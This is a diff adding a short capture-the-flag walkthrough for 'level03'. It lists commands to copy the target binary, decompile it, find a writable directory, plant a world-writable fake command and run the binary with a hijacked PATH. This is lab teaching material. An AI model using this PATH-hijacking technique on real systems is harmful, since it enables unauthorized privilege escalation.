@@ -1,0 +1,5 @@
+1.	retrieve exec level03:	scp -r -P <port> <remote@ip>:/<pathOfFile> /<pathToLocal>
+2.	use dogbolt.org/gdb/nm for hint on 'source code'
+3.	find writable location:	find / -maxdepth 1 -type d -perm /u=rwx -writable -print
+4.	create file with path to command:	/bin/getflag	/!\don't forget to chmod 777
+5.	run exec:	PATH=/<writableLocation> ./<exec>
